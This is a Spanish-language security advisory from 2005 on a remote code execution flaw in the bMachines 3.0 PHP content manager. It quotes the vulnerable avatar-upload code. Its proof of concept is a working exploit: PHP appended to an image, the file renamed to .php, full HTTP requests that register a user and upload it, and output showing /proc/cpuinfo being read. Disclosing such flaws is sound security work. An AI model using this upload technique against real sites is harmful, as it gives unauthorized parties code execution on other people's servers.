@@ -1,0 +1,141 @@
+=====================================================
+bMachines 3.0 platinum: Remote code execution
+=====================================================
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+=====================================================
+
+==== Introduccion
+
+bMachines es otro de esos sistemas de gestión de noticias,
+contenidos o bitácoras. Como tantos otros está hecho en
+PHP y usa MySQL como sistema de backend. Y también, como
+tantos otros, permite la ejecución remota de código 
+por parte de un usuario no autorizado.
+
+En este caso el método usado para conseguir ejecutar codigo
+remoto está relacionado con el tratamiento que bmachines
+da a las imágenes (avatares) asociados a cada usuario del
+sistema. 
+
+==== Código: Subir una imagen para el usuario.
+==== ./bmc/inc/users/users.inc.php
+
+	// Upload the user picture
+        if($_FILES['user_pic']['name']) {
+                // Check or valid filesize
+                if(!isset($_FILES['user_pic']['size']) || 
+		$_FILES['user_pic']['size'] > ($bmc_vars['user_pic_size']*1024)) {
+                        bmc_Template('error_page',str_replace("%size%",
+			$bmc_vars['user_pic_size'],$lang['user_pic_size_fail']));
+                }
+
+                $ext=explode(".",$_FILES['user_pic']['name']);
+                $ext=trim($ext[count($ext)-1]);
+                $user_pic=$user."_pic.".$ext;
+
+                @move_uploaded_file($_FILES['user_pic']['tmp_name'], 
+		CFG_PARENT."/files/".$user_pic);
+
+                        // Verify image
+                        $img=@getimagesize(CFG_PARENT."/files/".$user_pic);
+
+                        // BIG SIZE!
+                        if((!isset($img[0]) || !isset($img[1])) || ($img[0] > 
+			$bmc_vars['user_pic_width'] || $img[1] > 
+			$bmc_vars['user_pic_height'])) {
+                                @unlink(CFG_PARENT."/files/".$user_pic);
+                                bmc_Template('error_page',str_replace("%width%",
+				$bmc_vars['user_pic_width'],str_replace("%height%",
+				$bmc_vars['user_pic_height'],$lang['user_pic_dimension_fail'])));
+                        }
+                $user_pic_sql=",user_pic='{$user_pic}'";
+        } else {
+                $user_pic_sql="";
+        }
+
+Este es el código encargado de subir un nuevo fichero de imagen para un usuario concreto,
+podemos ver que el nombre del fichero será: 
+
+    "nombre-del-usuario" + "_pic" + "extension"
+
+    Ejemplo para el usuario pepito: pepito_pic.jpg
+
+Las limitaciones son un tamaño inferior a X bytes  y una resolución inferior a Y por Z pixels.
+Por defecto el tamaño en pixels debe ser inferior a 200x200 pixels.
+
+Las debilidades de este sistema son 2. La primera y fundamental: permitir subir ficheros con
+cualquier tipo de extensión. La segunda y más sutil: dar por válido un fichero por el hecho
+de que la función "getimagesize" retorne una información válida, ya que la mayoría de formatos
+de imagen admiten que les sean concatenados datos al final de los mismos sin sufrir modifica
+ción alguna o comentarios en la propia imagen. 
+
+==== Proof of concept: Ejecución remota de código. 
+
+La explotación de esta vulnerabilidad sólo requiere de una imagen de tamaño 
+inferior a 200x200 y concatenar código PHP a ella. 
+
+$ cat >> exploit.jpg 
+<? include("/proc/cpuinfo"); ?>
+$ mv exploit.jpg exploit.php
+
+Acto seguido creamos un usuario en bMachines, en este caso hemos elegido de 
+nombre de usuario "exploit".
+
+POST http://hawking/bmachine/register.php HTTP/1.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Accept-Encoding: gzip,deflate
+Accept-Language: es-es,en-us;q=0.7,en;q=0.3
+Host: hawking
+Referer: http://hawking/bmachine/register.php
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.6) Gecko/20050302 Firefox/1.0.1 Fedora/1.0.1-1.3.2
+Content-Length: 130
+Content-Type: application/x-www-form-urlencoded
+Keep-Alive: 300
+
+action=user_reg&user_login=exploit&full_name=exploit&password=exploit&password2=exploit&email=exploit&url=http://exploit&blogs[]=1
+
+Por último seleccionaremos la imagen modificada como imagen de nuestro usuario.
+
+POST http://hawking/bmachine/user.php HTTP/1.1
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Accept-Encoding: gzip,deflate
+Accept-Language: es-es,en-us;q=0.7,en;q=0.3
+Host: hawking
+Referer: http://hawking/bmachine/user.php?action=my_account
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.6) Gecko/20050302 Firefox/1.0.1 Fedora/1.0.1-1.3.2
+Content-Length: 10027
+Content-Type: multipart/form-data; boundary=---------------------------4290330361221439563167621939
+Cookie: BMC_user_password=708697c63f7eb369319c6523380bdf7a; BMC_user=exploit
+Keep-Alive: 300
+
+(..)
+
+==== Demo: Inclusión de /proc/cpuinfo
+
+$ links --dump  http://hawking/bmachine/files/exploit_pic.php
+(..)
+
+   processor : 0 vendor_id : GenuineIntel cpu family : 6 model : 13 model
+   name : Intel(R) Pentium(R) M processor 1.60GHz stepping : 6 cpu MHz :
+   598.607 cache size : 2048 KB fdiv_bug : no hlt_bug : no f00f_bug : no
+   coma_bug : no fpu : yes fpu_exception : yes cpuid level : 2 wp : yes flags
+   : fpu vme de pse tsc msr mce cx8 mtrr pge mca cmov pat clflush dts acpi
+   mmx fxsr sse sse2 ss tm pbe est tm2 bogomips : 1182.72
+
+==== Línea de publicación
+
+No hay línea de publicación.
+
+==== Nota final
+
+register_globals puesto a "off" no elimina esta vulnerabilidad.
+
+================================
+FraMe - frame at kernelpanik.org
+http://www.kernelpanik.org
+2005 (C) Kernelpanik Labs
+================================        
+
